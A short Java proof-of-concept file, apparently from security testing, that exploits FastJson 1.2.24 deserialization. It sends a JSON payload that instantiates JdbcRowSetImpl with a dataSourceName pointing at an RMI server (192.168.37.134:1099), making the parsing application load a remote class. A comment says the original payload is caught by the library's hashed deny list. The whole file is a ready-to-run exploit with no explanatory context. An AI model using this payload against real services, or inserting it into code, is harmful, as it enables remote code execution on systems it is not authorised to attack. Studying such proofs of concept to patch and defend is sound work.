import com.alibaba.fastjson.JSON;
import com.sun.rowset.JdbcRowSetImpl;

public class JNDIPoC {
    // original one
    // is blocked by denyList (But this version use hash, not string)
    public static void main(String[] args) throws Exception {
        System.out.println("[+] Test FastJson 1.2.24 JNDI PoC");
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://192.168.37.134:1099/j1dse2\", \"autoCommit\":true}";
        JSON.parse(payload);

    }
}
